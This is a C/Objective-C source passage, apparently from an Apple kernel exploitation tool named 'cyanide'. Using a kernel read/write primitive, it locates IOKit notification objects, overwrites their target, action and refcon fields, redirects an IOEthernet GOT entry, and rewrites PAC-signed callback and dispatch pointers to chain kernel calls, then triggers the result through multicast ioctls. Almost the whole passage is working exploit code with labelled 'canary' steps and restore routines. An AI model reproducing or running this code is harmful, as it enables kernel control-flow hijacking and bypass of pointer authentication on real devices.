        errno = EINVAL;
        return -1;
    }
    int fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    struct sockaddr_un address = {.sun_family = AF_UNIX};
    strcpy(address.sun_path, path);
    if (connect(fd, (struct sockaddr *)&address, sizeof(address)) != 0) {
        int savedErrno = errno;
        close(fd);
        errno = savedErrno;
        return -1;
    }
    return fd;
}

static bool CNDParseU64(const char *text, uint64_t *value)
{
    if (text == NULL || value == NULL || text[0] == '\0' ||
        text[0] == '-') return false;
    errno = 0;
    char *end = NULL;
    unsigned long long parsed = strtoull(text, &end, 0);
    if (errno != 0 || end == text || *end != '\0') return false;
    *value = (uint64_t)parsed;
    return true;
}

static bool CNDParseOptions(int argc, const char *argv[], CNDOptions *options)
{
    if (options == NULL || argc < 4) return false;
    *options = (CNDOptions){0};
    for (int index = 4; index < argc; index++) {
        if (strcmp(argv[index], "--notification-target-swap") == 0) {
            if (options->notificationTargetSwap ||
                options->notificationBlockCanary ||
                options->notificationSandboxCanary ||
                options->notification2ABE73D8Canary ||
                options->ifnetCheckMultiPACCanary ||
                options->ifnetKCall1PACCanary ||
                options->sysctlPACCensus) return false;
            options->notificationTargetSwap = true;
            continue;
        }
        if (strcmp(argv[index], "--notification-block-canary") == 0) {
            if (options->notificationTargetSwap ||
                options->notificationBlockCanary ||
                options->notificationSandboxCanary ||
                options->notification2ABE73D8Canary ||
                options->ifnetCheckMultiPACCanary ||
                options->ifnetKCall1PACCanary ||
                options->sysctlPACCensus) return false;
            options->notificationBlockCanary = true;
            continue;
        }
        if (strcmp(argv[index], "--notification-sandbox-canary") == 0) {
            if (options->notificationTargetSwap ||
                options->notificationBlockCanary ||
                options->notificationSandboxCanary ||
                options->notification2ABE73D8Canary ||
                options->ifnetCheckMultiPACCanary ||
                options->ifnetKCall1PACCanary ||
                options->sysctlPACCensus) return false;
            options->notificationSandboxCanary = true;
            continue;
        }
        if (strcmp(argv[index], "--notification-2abe-73d8-canary") == 0) {
            if (options->notificationTargetSwap ||
                options->notificationBlockCanary ||
                options->notificationSandboxCanary ||
                options->notification2ABE73D8Canary ||
                options->ifnetCheckMultiPACCanary ||
                options->ifnetKCall1PACCanary ||
                options->sysctlPACCensus) return false;
            options->notification2ABE73D8Canary = true;
            continue;
        }
        if (strcmp(argv[index], "--ifnet-check-multi-pac-canary") == 0) {
            if (options->notificationTargetSwap ||
                options->notificationBlockCanary ||
                options->notificationSandboxCanary ||
                options->notification2ABE73D8Canary ||
                options->ifnetCheckMultiPACCanary ||
                options->ifnetKCall1PACCanary ||
                options->sysctlPACCensus) return false;
            options->ifnetCheckMultiPACCanary = true;
            continue;
        }
        if (strcmp(argv[index], "--ifnet-kcall1-pac-canary") == 0) {
            if (options->notificationTargetSwap ||
                options->notificationBlockCanary ||
                options->notificationSandboxCanary ||
                options->notification2ABE73D8Canary ||
                options->ifnetCheckMultiPACCanary ||
                options->ifnetKCall1PACCanary ||
                options->sysctlPACCensus) return false;
            options->ifnetKCall1PACCanary = true;
            continue;
        }
        if (strcmp(argv[index], "--sysctl-pac-census") == 0) {
            if (options->notificationTargetSwap ||
                options->notificationBlockCanary ||
                options->notificationSandboxCanary ||
                options->notification2ABE73D8Canary ||
                options->ifnetCheckMultiPACCanary ||
                options->ifnetKCall1PACCanary ||
                options->sysctlPACCensus) return false;
            options->sysctlPACCensus = true;
            continue;
        }
        if (strcmp(argv[index], "--hold") == 0 && index + 1 < argc) {
            uint64_t value = 0;
            if (options->holdSeconds != 0 ||
                !CNDParseU64(argv[++index], &value) || value > 300) {
                return false;
            }
            options->holdSeconds = (int)value;
            continue;
        }
        return false;
    }
    return true;
}

static uint32_t CNDDrainIterator(io_iterator_t iterator)
{
    uint32_t count = 0;
    for (;;) {
        io_service_t service = IOIteratorNext(iterator);
        if (!MACH_PORT_VALID(service)) break;
        count++;
        IOObjectRelease(service);
    }
    return count;
}

static void CNDNotificationCallback(void *refcon, io_iterator_t iterator)
{
    CNDNotificationObserver *observer = refcon;
    if (observer == NULL) return;
    atomic_store_explicit(&observer->lastIterator,
        (uint32_t)iterator, memory_order_relaxed);
    atomic_fetch_add_explicit(&observer->callbacks, 1,
        memory_order_relaxed);
    if (dispatch_get_specific(&CNDQueueAKey) != NULL) {
        atomic_fetch_add_explicit(&observer->onQueueA, 1,
            memory_order_relaxed);
    }
    if (dispatch_get_specific(&CNDQueueBKey) != NULL) {
        atomic_fetch_add_explicit(&observer->onQueueB, 1,
            memory_order_relaxed);
    }
    atomic_fetch_add_explicit(&observer->services,
        CNDDrainIterator(iterator), memory_order_relaxed);
    dispatch_semaphore_signal(observer->semaphore);
}

static void CNDDispatchBarrier(void *unused)
{
    (void)unused;
}

static void CNDCleanupNotificationSwap(CNDNotificationSwap *swap)
{
    if (swap == NULL) return;
    if (swap->portA != NULL) {
        IONotificationPortSetDispatchQueue(swap->portA, NULL);
    }
    if (swap->portB != NULL) {
        IONotificationPortSetDispatchQueue(swap->portB, NULL);
    }
    if (swap->queueA != NULL) {
        dispatch_sync_f(swap->queueA, NULL, CNDDispatchBarrier);
    }
    if (swap->queueB != NULL) {
        dispatch_sync_f(swap->queueB, NULL, CNDDispatchBarrier);
    }
    if (MACH_PORT_VALID(swap->iteratorA)) {
        IOObjectRelease(swap->iteratorA);
        swap->iteratorA = IO_OBJECT_NULL;
    }
    if (MACH_PORT_VALID(swap->iteratorB)) {
        IOObjectRelease(swap->iteratorB);
        swap->iteratorB = IO_OBJECT_NULL;
    }
    if (swap->portA != NULL) {
        IONotificationPortDestroy(swap->portA);
        swap->portA = NULL;
    }
    if (swap->portB != NULL) {
        IONotificationPortDestroy(swap->portB);
        swap->portB = NULL;
    }
}

static int CNDPrepareNotificationSwap(int fd, uint64_t slide,
    uint64_t selfProcess, bool blockActionRequired, bool noOpBlockCanary,
    bool sandboxCanary,
    CNDNotificationSwap *swap,
    NSMutableDictionary<NSString *, id> *report)
{
    if (swap == NULL || report == nil) return EINVAL;
    *swap = (CNDNotificationSwap){0};
    swap->observerA.semaphore = dispatch_semaphore_create(0);
    swap->observerB.semaphore = dispatch_semaphore_create(0);
    swap->queueA = dispatch_queue_create(
        "com.zeroxjf.cyanide.notifier-a", DISPATCH_QUEUE_SERIAL);
    swap->queueB = dispatch_queue_create(
        "com.zeroxjf.cyanide.notifier-b", DISPATCH_QUEUE_SERIAL);
    if (swap->observerA.semaphore == NULL ||
        swap->observerB.semaphore == NULL || swap->queueA == NULL ||
        swap->queueB == NULL) {
        return ENOMEM;
    }
    dispatch_queue_set_specific(swap->queueA,
        &CNDQueueAKey, &CNDQueueAKey, NULL);
    dispatch_queue_set_specific(swap->queueB,
        &CNDQueueBKey, &CNDQueueBKey, NULL);
    swap->portA = IONotificationPortCreate(MACH_PORT_NULL);
    swap->portB = IONotificationPortCreate(MACH_PORT_NULL);
    if (swap->portA == NULL || swap->portB == NULL) return ENOMEM;
    IONotificationPortSetDispatchQueue(swap->portA, swap->queueA);
    IONotificationPortSetDispatchQueue(swap->portB, swap->queueB);

    kern_return_t notificationAKR = IOServiceAddMatchingNotification(
        swap->portA, kIOFirstPublishNotification,
        IOServiceMatching("IOUserEthernetInterface"),
        CNDNotificationCallback, &swap->observerA, &swap->iteratorA);
    kern_return_t notificationBKR = IOServiceAddMatchingNotification(
        swap->portB, kIOFirstPublishNotification,
        IOServiceMatching("CNDNoSuchIOServiceCyanide23A341"),
        CNDNotificationCallback, &swap->observerB, &swap->iteratorB);
    report[@"notificationAKR"] = CNDHex((uint32_t)notificationAKR);
    report[@"notificationBKR"] = CNDHex((uint32_t)notificationBKR);
    if (notificationAKR != KERN_SUCCESS ||
        notificationBKR != KERN_SUCCESS ||
        !MACH_PORT_VALID(swap->iteratorA) ||
        !MACH_PORT_VALID(swap->iteratorB)) {
        return EIO;
    }
    report[@"notificationAExistingCount"] =
        @(CNDDrainIterator(swap->iteratorA));
    report[@"notificationBExistingCount"] =
        @(CNDDrainIterator(swap->iteratorB));

    uint64_t task = CNDProcessTask(fd, selfProcess);
    uint64_t ipcTable = CNDTaskIPCTable(fd, task);
    report[@"selfTask"] = CNDHex(task);
    report[@"selfIPCTable"] = CNDHex(ipcTable);
    if (!CNDKernelObject(task) || !CNDKernelObject(ipcTable)) return EILSEQ;

    CNDNotifierRecord *records = calloc(
        CNDMaxNotifiers, sizeof(*records));
    if (records == NULL) return ENOMEM;
    uint32_t recordCount = 0;
    int result = CNDLoadNotifiers(fd, slide, records,
        CNDMaxNotifiers, &recordCount);
    if (result == 0) {
        result = CNDResolveNotificationTarget(fd, ipcTable,
            swap->iteratorA, records, recordCount,
            &swap->wrapperA, &swap->targetA, &swap->vtableA,
            &swap->notifierA);
    }
    if (result == 0) {
        result = CNDResolveNotificationTarget(fd, ipcTable,
            swap->iteratorB, records, recordCount,
            &swap->wrapperB, &swap->targetB, &swap->vtableB,
            &swap->notifierB);
    }
    uint64_t expectedBlockAction = CNDStaticBlockNotificationAction + slide;
    if (result == 0 && blockActionRequired) {
        for (uint32_t index = 0; index < recordCount; index++) {
            if (records[index].action != expectedBlockAction ||
                (records[index].state & 1) == 0 ||
                records[index].ref == 0) {
                continue;
            }
            if (swap->blockActionDonorCount != 0 &&
                records[index].rawAction !=
                    swap->blockActionDonor.rawAction) {
                result = EILSEQ;
                break;
            }
            if (swap->blockActionDonorCount == 0) {
                swap->blockActionDonor = records[index];
            }
            swap->blockActionDonorCount++;
        }
        if (result == 0 && swap->blockActionDonorCount == 0) {
            result = ENOENT;
        }
    }
    uint64_t expectedSandboxAction =
        CNDStaticSandboxNotificationAction + slide;
    uint64_t expectedSandboxCallback =
        CNDStaticSandboxPublishCallback + slide;
    if (result == 0 && sandboxCanary) {
        for (uint32_t index = 0; index < recordCount; index++) {
            if (records[index].action != expectedSandboxAction ||
                records[index].target != expectedSandboxCallback ||
                records[index].rawTarget == 0 ||
                (records[index].state & 1) == 0 ||
                records[index].ref != 0) {
                continue;
            }
            if (swap->sandboxActionDonorCount != 0 &&
                (records[index].rawAction !=
                    swap->sandboxActionDonor.rawAction ||
                 records[index].rawTarget !=
                    swap->sandboxActionDonor.rawTarget)) {
                result = EILSEQ;
                break;
            }
            if (swap->sandboxActionDonorCount == 0) {
                swap->sandboxActionDonor = records[index];
            }
            swap->sandboxActionDonorCount++;
        }
        if (result == 0 && swap->sandboxActionDonorCount == 0) {
            result = ENOENT;
        }
    }
    free(records);
    report[@"notifierInventoryCount"] = @(recordCount);
    report[@"notificationAWrapper"] = CNDHex(swap->wrapperA);
    report[@"notificationBWrapper"] = CNDHex(swap->wrapperB);
    report[@"notificationATarget"] = CNDHex(swap->targetA);
    report[@"notificationBTarget"] = CNDHex(swap->targetB);
    report[@"notificationANotifier"] = CNDHex(swap->notifierA.notifier);
    report[@"notificationBNotifier"] = CNDHex(swap->notifierB.notifier);
    report[@"notificationAVtable"] = CNDHex(swap->vtableA);
    report[@"notificationBVtable"] = CNDHex(swap->vtableB);
    report[@"notificationAActionRaw"] =
        CNDHex(swap->notifierA.rawAction);
    report[@"notificationBActionRaw"] =
        CNDHex(swap->notifierB.rawAction);
    report[@"notificationAAction"] = CNDHex(swap->notifierA.action);
    report[@"notificationBAction"] = CNDHex(swap->notifierB.action);
    report[@"notificationATargetRaw"] =
        CNDHex(swap->notifierA.rawTarget);
    report[@"notificationBTargetRaw"] =
        CNDHex(swap->notifierB.rawTarget);
    report[@"notificationARef"] = CNDHex(swap->notifierA.ref);
    report[@"notificationBRef"] = CNDHex(swap->notifierB.ref);
    report[@"notificationBlockActionDonorCount"] =
        @(swap->blockActionDonorCount);
    report[@"notificationBlockActionDonor"] =
        CNDHex(swap->blockActionDonor.notifier);
    report[@"notificationBlockActionRaw"] =
        CNDHex(swap->blockActionDonor.rawAction);
    report[@"notificationSandboxActionDonorCount"] =
        @(swap->sandboxActionDonorCount);
    report[@"notificationSandboxActionDonor"] =
        CNDHex(swap->sandboxActionDonor.notifier);
    report[@"notificationSandboxActionRaw"] =
        CNDHex(swap->sandboxActionDonor.rawAction);
    report[@"notificationSandboxCallbackRaw"] =
        CNDHex(swap->sandboxActionDonor.rawTarget);
    report[@"notificationSandboxCallback"] =
        CNDHex(swap->sandboxActionDonor.target);

    if (result == 0 && noOpBlockCanary) {
        swap->blockAddress = CNDStaticNoOpBlock + slide;
        uint8_t blockHeader[0x20] = {0};
        result = CNDKernelRead(fd, swap->blockAddress,
            blockHeader, sizeof(blockHeader));
        uint64_t isa = 0;
        uint64_t flagsAndReserved = 0;
        uint64_t descriptor = 0;
        memcpy(&isa, blockHeader, sizeof(isa));
        memcpy(&flagsAndReserved, blockHeader + 0x8,
            sizeof(flagsAndReserved));
        memcpy(&swap->blockInvokeRaw, blockHeader + 0x10,
            sizeof(swap->blockInvokeRaw));
        memcpy(&descriptor, blockHeader + 0x18, sizeof(descriptor));
        swap->blockInvoke = CNDStripInstructionPointer(
            swap->blockInvokeRaw);
        report[@"notificationBlockAddress"] =
            CNDHex(swap->blockAddress);
        report[@"notificationBlockISA"] = CNDHex(isa);
        report[@"notificationBlockFlags"] =
            CNDHex(flagsAndReserved);
        report[@"notificationBlockInvokeRaw"] =
            CNDHex(swap->blockInvokeRaw);
        report[@"notificationBlockInvoke"] =
            CNDHex(swap->blockInvoke);
        report[@"notificationBlockDescriptor"] = CNDHex(descriptor);
        if (result == 0 && (isa == 0 || descriptor == 0 ||
            flagsAndReserved != UINT64_C(0x50000000) ||
            swap->blockInvoke != CNDStaticNoOpBlockInvoke + slide)) {
            result = EILSEQ;
        }
    }

    uint64_t expectedAction = CNDStaticUserNotificationAction + slide;
    if (result != 0 || swap->targetA == swap->targetB ||
        swap->notifierA.notifier == swap->notifierB.notifier ||
        swap->vtableA != swap->vtableB ||
        swap->notifierA.action != expectedAction ||
        swap->notifierB.action != expectedAction ||
        swap->notifierA.rawTarget != swap->targetA ||
        swap->notifierB.rawTarget != swap->targetB ||
        swap->notifierA.ref != 0 || swap->notifierB.ref != 0 ||
        (swap->notifierA.state & 1) == 0 ||
        (swap->notifierB.state & 1) == 0) {
        return result != 0 ? result : EILSEQ;
    }
    swap->ready = true;
    return 0;
}

static int CNDWriteAndVerifyU64(int fd, uint64_t address,
    uint64_t desired)
{
    int result = CNDKernelWrite(fd, address, &desired, sizeof(desired));
    uint64_t observed = 0;
    if (result == 0) {
        result = CNDKernelRead(fd, address, &observed, sizeof(observed));
    }
    return result == 0 && observed == desired ? 0 : EILSEQ;
}

static int CNDPrepareIfnetPACCanary(int fd, uint64_t slide,
    CNDIfnetPACCanary *canary,
    NSMutableDictionary<NSString *, id> *report)
{
    if (canary == NULL || report == nil) return EINVAL;
    *canary = (CNDIfnetPACCanary){0};
    canary->gotAddress = CNDStaticIOEthernetCheckMultiGOT + slide;
    canary->canaryTarget = CNDStaticENOEXECReturn + slide;
    uint32_t instructions[3] = {0};
    int result = CNDKernelRead(fd, canary->gotAddress,
        &canary->originalRaw, sizeof(canary->originalRaw));
    if (result == 0) {
        result = CNDKernelRead(fd, canary->canaryTarget,
            instructions, sizeof(instructions));
    }
    canary->originalTarget = CNDStripInstructionPointer(
        canary->originalRaw);
    uint64_t expectedOriginal = CNDStaticEtherCheckMulti + slide;
    report[@"ifnetPACGOTAddress"] = CNDHex(canary->gotAddress);
    report[@"ifnetPACGOTOriginalRaw"] = CNDHex(canary->originalRaw);
    report[@"ifnetPACGOTOriginalTarget"] =
        CNDHex(canary->originalTarget);
    report[@"ifnetPACGOTExpectedTarget"] = CNDHex(expectedOriginal);
    report[@"ifnetPACCanaryTarget"] = CNDHex(canary->canaryTarget);
    report[@"ifnetPACCanaryInstruction0"] = CNDHex(instructions[0]);
    report[@"ifnetPACCanaryInstruction1"] = CNDHex(instructions[1]);
    report[@"ifnetPACCanaryInstruction2"] = CNDHex(instructions[2]);
    report[@"ifnetPACInitIfnetParams"] = CNDHex(
        CNDStaticIOEthernetInitIfnetParams + slide);
    report[@"ifnetPACSignerInstruction"] = CNDHex(
        CNDStaticIOEthernetCheckMultiSigner + slide);
    report[@"ifnetPACDiscriminator"] = @"0xe4fe";

    if (result != 0 || canary->originalRaw != expectedOriginal ||
        canary->originalTarget != expectedOriginal ||
        instructions[0] != UINT32_C(0xd503245f) ||
        instructions[1] != UINT32_C(0x52800100) ||
        instructions[2] != UINT32_C(0xd65f03c0)) {
        return result != 0 ? result : EILSEQ;
    }
    canary->ready = true;
    return 0;
}

static int CNDInstallIfnetPACCanary(int fd,
    CNDIfnetPACCanary *canary)
{
    if (canary == NULL || !canary->ready || canary->installed) {
        return EINVAL;
    }
    int result = CNDWriteAndVerifyU64(fd, canary->gotAddress,
        canary->canaryTarget);
    if (result == 0) canary->installed = true;
    return result;
}

static bool CNDRestoreIfnetPACCanary(int fd,
    CNDIfnetPACCanary *canary)
{
    if (canary == NULL || !canary->ready) return false;
    for (unsigned int attempt = 0; attempt < 3; attempt++) {
        if (CNDWriteAndVerifyU64(fd, canary->gotAddress,
                canary->originalRaw) == 0) {
            canary->installed = false;
            canary->restored = true;
            return true;
        }
    }
    return false;
}

static void CNDTriggerIfnetCheckMulti(NSString *bsdName,
    int *ioctlResult, int *ioctlErrno,
    int *cleanupResult, int *cleanupErrno)
{
    if (ioctlResult != NULL) *ioctlResult = -1;
    if (ioctlErrno != NULL) *ioctlErrno = EINVAL;
    if (cleanupResult != NULL) *cleanupResult = -1;
    if (cleanupErrno != NULL) *cleanupErrno = 0;
    const char *name = bsdName.UTF8String;
    if (name == NULL || name[0] == '\0' || strlen(name) >= IFNAMSIZ) return;

    int socketFD = socket(AF_INET, SOCK_DGRAM, 0);
    if (socketFD < 0) {
        if (ioctlErrno != NULL) *ioctlErrno = errno;
        return;
    }
    struct ifreq request = {0};
    strlcpy(request.ifr_name, name, sizeof(request.ifr_name));
    request.ifr_addr.sa_len = sizeof(request.ifr_addr);
    request.ifr_addr.sa_family = AF_UNSPEC;
    const uint8_t multicastAddress[6] = {
        0x01, 0x00, 0x5e, 0x00, 0x00, 0xfb,
    };
    memcpy(request.ifr_addr.sa_data, multicastAddress,
        sizeof(multicastAddress));
    errno = 0;
    int result = ioctl(socketFD, SIOCADDMULTI, &request);
    int savedErrno = errno;
    if (ioctlResult != NULL) *ioctlResult = result;
    if (ioctlErrno != NULL) *ioctlErrno = savedErrno;

    if (result == 0) {
        errno = 0;
        int removed = ioctl(socketFD, SIOCDELMULTI, &request);
        int removeErrno = errno;
        if (cleanupResult != NULL) *cleanupResult = removed;
        if (cleanupErrno != NULL) *cleanupErrno = removeErrno;
    }
    close(socketFD);
}

static int CNDInstallNotificationBlock(int fd,
    CNDNotificationSwap *swap);

static bool CNDKernelAddress(uint64_t value)
{
    return value >= UINT64_C(0xfffffe0000000000) &&
        value < UINT64_C(0xfffffffffffffff8) &&
        (value & UINT64_C(0x7)) == 0;
}

static int CNDReadSignedInstructionFixup(int fd, uint64_t address,
    uint64_t expectedTarget, uint64_t *raw)
{
    uint64_t value = 0;
    int result = CNDKernelRead(fd, address, &value, sizeof(value));
    if (result != 0) return result;
    if (value == 0 || CNDStripInstructionPointer(value) != expectedTarget) {
        return EILSEQ;
    }
    if (raw != NULL) *raw = value;
    return 0;
}

static int CNDPrepare2ABE73D8Chain(int fd, uint64_t slide,
    CNDNotificationSwap *swap,
    NSMutableDictionary<NSString *, id> *report)
{
    if (swap == NULL || report == nil || !swap->ready ||
        swap->blockActionDonorCount == 0 || swap->pacChainPrepared) {
        return EINVAL;
    }
    int result = CNDReadSignedInstructionFixup(fd,
        CNDStatic2ABEAdapterFixup + slide,
        CNDStatic2ABEAdapter + slide, &swap->pacAdapterRaw);
    if (result == 0) {
        result = CNDReadSignedInstructionFixup(fd,
            CNDStatic2ABEReturnFixup + slide,
            CNDStatic2ABEReturn + slide, &swap->pac2ABEReturnRaw);
    }
    if (result == 0) {
        result = CNDReadSignedInstructionFixup(fd,
            CNDStatic73D8ReturnFixup + slide,
            CNDStatic73D8Return + slide, &swap->pac73D8ReturnRaw);
    }

    swap->blockAddress = CNDStatic2ABEBlock + slide;
    uint8_t blockHeader[0x20] = {0};
    if (result == 0) {
        result = CNDKernelRead(fd, swap->blockAddress,
            blockHeader, sizeof(blockHeader));
    }
    uint64_t blockISA = 0;
    uint64_t blockFlags = 0;
    uint64_t blockDescriptor = 0;
    if (result == 0) {
        memcpy(&blockISA, blockHeader, sizeof(blockISA));
        memcpy(&blockFlags, blockHeader + 0x8, sizeof(blockFlags));
        memcpy(&swap->blockInvokeRaw, blockHeader + 0x10,
            sizeof(swap->blockInvokeRaw));
        memcpy(&blockDescriptor, blockHeader + 0x18,
            sizeof(blockDescriptor));
        swap->blockInvoke = CNDStripInstructionPointer(
            swap->blockInvokeRaw);
        if (blockISA == 0 || blockDescriptor == 0 ||
            swap->blockInvoke != CNDStatic2ABEBlockInvoke + slide) {
            result = EILSEQ;
        }
    }

    uint64_t registry = CNDStatic2ABERegistry + slide;
    uint64_t packedCounts = 0;
    uint64_t rawArray = 0;
    if (result == 0) {
        result = CNDKernelRead(fd, registry + 0x8,
            &packedCounts, sizeof(packedCounts));
    }
    if (result == 0) {
        result = CNDKernelRead(fd, registry + 0x18,
            &rawArray, sizeof(rawArray));
    }
    uint32_t lowerIndex = (uint32_t)packedCounts;
    uint32_t dispatchCount = (uint32_t)(packedCounts >> 32);
    uint32_t entryCount = dispatchCount;
    if (lowerIndex < CNDMax2ABERegistryEntries &&
        lowerIndex + 1 > entryCount) {
        entryCount = lowerIndex + 1;
    }
    uint64_t array = CNDStripDataPointer(rawArray);
    if (result == 0 && (dispatchCount > CNDMax2ABERegistryEntries - 1 ||
        lowerIndex > CNDMax2ABERegistryEntries - 1 ||
        entryCount > CNDMax2ABERegistryEntries ||
        (entryCount != 0 && !CNDKernelAddress(array)))) {
        result = EILSEQ;
    }
    for (uint32_t index = 0; result == 0 && index < entryCount; index++) {
        uint64_t rawEntry = 0;
        result = CNDKernelRead(fd, array + (uint64_t)index * 8,
            &rawEntry, sizeof(rawEntry));
        if (result != 0 || rawEntry == 0) continue;
        uint64_t entry = CNDStripDataPointer(rawEntry);
        uint64_t rawOwner = 0;
        if (!CNDKernelAddress(entry)) {
            result = EILSEQ;
            break;
        }
        result = CNDKernelRead(fd, entry + 0x20,
            &rawOwner, sizeof(rawOwner));
        uint64_t owner = CNDStripDataPointer(rawOwner);
        if (result != 0 || !CNDKernelAddress(owner)) {
            result = result != 0 ? result : EILSEQ;
            break;
        }
        uint64_t field = owner + 0xc0;
        bool duplicate = false;
        for (uint32_t prior = 0; prior < swap->pacCallbackCount; prior++) {
            if (swap->pacCallbackFields[prior] == field) {
                duplicate = true;
                break;
            }
        }
        if (duplicate) continue;
        uint64_t rawCallback = 0;
        result = CNDKernelRead(fd, field,
            &rawCallback, sizeof(rawCallback));
        if (result != 0 || rawCallback == 0) continue;
        if (swap->pacCallbackCount >= CNDMax2ABERegistryEntries) {
            result = E2BIG;
            break;
        }
        uint32_t slot = swap->pacCallbackCount++;
        swap->pacCallbackFields[slot] = field;
        swap->pacCallbackOriginals[slot] = rawCallback;
    }
    if (result == 0 && swap->pacCallbackCount == 0) result = ENOENT;

    uint64_t rawDispatchObject = 0;
    if (result == 0) {
        result = CNDKernelRead(fd,
            CNDStaticSHA256DispatchGlobal + slide,
            &rawDispatchObject, sizeof(rawDispatchObject));
    }
    swap->pacDispatchObject = CNDStripDataPointer(rawDispatchObject);
    if (result == 0 && !CNDKernelAddress(swap->pacDispatchObject)) {
        result = EILSEQ;
    }
    if (result == 0) {
        result = CNDKernelRead(fd, swap->pacDispatchObject,
            &swap->pacDispatchTargetOriginal,
            sizeof(swap->pacDispatchTargetOriginal));
    }
    if (result == 0 && swap->pacDispatchTargetOriginal == 0) {
        result = EILSEQ;
    }

    report[@"notification2ABERegistry"] = CNDHex(registry);
    report[@"notification2ABELowerIndex"] = @(lowerIndex);
    report[@"notification2ABEDispatchCount"] = @(dispatchCount);
    report[@"notification2ABEEntryCount"] = @(entryCount);
    report[@"notification2ABEArray"] = CNDHex(array);
    report[@"notification2ABECallbackCount"] =
        @(swap->pacCallbackCount);
    report[@"notification2ABEBlock"] = CNDHex(swap->blockAddress);
    report[@"notification2ABEBlockISA"] = CNDHex(blockISA);
    report[@"notification2ABEBlockFlags"] = CNDHex(blockFlags);
    report[@"notification2ABEBlockInvokeRaw"] =
        CNDHex(swap->blockInvokeRaw);
    report[@"notification2ABEBlockInvoke"] =
        CNDHex(swap->blockInvoke);
    report[@"notification2ABEBlockDescriptor"] =
        CNDHex(blockDescriptor);
    report[@"notification2ABEAdapterRaw"] =
        CNDHex(swap->pacAdapterRaw);
    report[@"notification2ABEReturnRaw"] =
        CNDHex(swap->pac2ABEReturnRaw);
    report[@"notification73D8ReturnRaw"] =
        CNDHex(swap->pac73D8ReturnRaw);
    report[@"notification73D8DispatchObject"] =
        CNDHex(swap->pacDispatchObject);
    report[@"notification73D8DispatchTargetOriginal"] =
        CNDHex(swap->pacDispatchTargetOriginal);
    swap->pacChainPrepared = result == 0;
    return result;
}

static bool CNDRestore2ABE73D8Fields(int fd,
    CNDNotificationSwap *swap)
{
    if (swap == NULL || !swap->pacChainInstalled) return false;
    bool callbacksRestored = true;
    for (uint32_t reverse = swap->pacCallbackCount; reverse != 0;
         reverse--) {
        uint32_t index = reverse - 1;
        bool restored = false;
        for (unsigned int attempt = 0; attempt < 3; attempt++) {
            if (CNDWriteAndVerifyU64(fd,
                    swap->pacCallbackFields[index],
                    swap->pacCallbackOriginals[index]) == 0) {
                restored = true;
                break;
            }
        }
        callbacksRestored = callbacksRestored && restored;
    }
    bool dispatchRestored = false;
    if (callbacksRestored) {
        for (unsigned int attempt = 0; attempt < 3; attempt++) {
            if (CNDWriteAndVerifyU64(fd, swap->pacDispatchObject,
                    swap->pacDispatchTargetOriginal) == 0) {
                dispatchRestored = true;
                break;
            }
        }
    }
    if (callbacksRestored && dispatchRestored) {
        swap->pacChainInstalled = false;
        swap->pacChainRestored = true;
        return true;
    }
    return false;
}

static int CNDInstall2ABE73D8Chain(int fd,
    CNDNotificationSwap *swap)
{
    if (swap == NULL || !swap->pacChainPrepared ||
        swap->pacChainInstalled || swap->blockInstalled) return EINVAL;
    uint64_t observed = 0;
    int result = CNDKernelRead(fd, swap->pacDispatchObject,
        &observed, sizeof(observed));
    if (result != 0 || observed != swap->pacDispatchTargetOriginal) {
        return result != 0 ? result : EBUSY;
    }
    for (uint32_t index = 0; index < swap->pacCallbackCount; index++) {
        result = CNDKernelRead(fd, swap->pacCallbackFields[index],
            &observed, sizeof(observed));
        if (result != 0 || observed != swap->pacCallbackOriginals[index]) {
            return result != 0 ? result : EBUSY;
        }
    }

    /* Keep the adapter's shared second stage benign before exposing it. */
    result = CNDWriteAndVerifyU64(fd, swap->pacDispatchObject,
        swap->pac73D8ReturnRaw);
    uint32_t installedCallbacks = 0;
    for (; result == 0 && installedCallbacks < swap->pacCallbackCount;
         installedCallbacks++) {
        uint64_t desired = installedCallbacks == 0
            ? swap->pacAdapterRaw : swap->pac2ABEReturnRaw;
        result = CNDWriteAndVerifyU64(fd,
            swap->pacCallbackFields[installedCallbacks], desired);
    }
    if (result == 0) {
        swap->pacChainInstalled = true;
        result = CNDInstallNotificationBlock(fd, swap);
    }
    if (result != 0) {
        for (uint32_t reverse = installedCallbacks; reverse != 0;
             reverse--) {
            uint32_t index = reverse - 1;
            (void)CNDWriteAndVerifyU64(fd,
                swap->pacCallbackFields[index],
                swap->pacCallbackOriginals[index]);
        }
        (void)CNDWriteAndVerifyU64(fd, swap->pacDispatchObject,
            swap->pacDispatchTargetOriginal);
        swap->pacChainInstalled = false;
    }
    return result;
}

static int CNDWriteAndVerifyTarget(int fd, uint64_t notifier,
    uint64_t desired)
{
    if (!CNDKernelObject(notifier) || !CNDKernelObject(desired)) {
        return EINVAL;
    }
    int result = CNDKernelWrite(fd,
        notifier + CNDNotifierTargetOffset, &desired, sizeof(desired));
    uint64_t observed = 0;
    if (result == 0) {
        result = CNDKernelRead(fd,
            notifier + CNDNotifierTargetOffset,
            &observed, sizeof(observed));
    }
    return result == 0 && observed == desired ? 0 : EILSEQ;
}

static int CNDInstallNotificationTarget(int fd,
    CNDNotificationSwap *swap)
{
    if (swap == NULL || !swap->ready || swap->targetInstalled) return EINVAL;
    int result = CNDWriteAndVerifyTarget(fd,
        swap->notifierA.notifier, swap->notifierB.rawTarget);
    swap->targetInstalled = result == 0;
    return result;
}

static bool CNDRestoreNotificationTarget(int fd,
    CNDNotificationSwap *swap)
{
    if (swap == NULL || !swap->targetInstalled) return false;
    for (unsigned int attempt = 0; attempt < 3; attempt++) {
        if (CNDWriteAndVerifyTarget(fd, swap->notifierA.notifier,
                swap->notifierA.rawTarget) == 0) {
            swap->targetInstalled = false;
            swap->targetRestored = true;
            return true;
        }
    }
    return false;
}

static int CNDInstallNotificationBlock(int fd,
    CNDNotificationSwap *swap)
{
    if (swap == NULL || !swap->ready || swap->blockInstalled ||
        swap->blockActionDonorCount == 0 || swap->blockAddress == 0) {
        return EINVAL;
    }
    /* The stock handler ignores this refcon; publish it before the action. */
    int result = CNDWriteAndVerifyU64(fd,
        swap->notifierA.notifier + CNDNotifierRefOffset,
        swap->blockAddress);
    if (result == 0) {
        result = CNDWriteAndVerifyU64(fd,
            swap->notifierA.notifier + CNDNotifierActionOffset,
            swap->blockActionDonor.rawAction);
    }
    if (result != 0) {
        (void)CNDWriteAndVerifyU64(fd,
            swap->notifierA.notifier + CNDNotifierActionOffset,
            swap->notifierA.rawAction);
        (void)CNDWriteAndVerifyU64(fd,
            swap->notifierA.notifier + CNDNotifierRefOffset,
            swap->notifierA.ref);
        return result;
    }
    swap->blockInstalled = true;
    return 0;
}

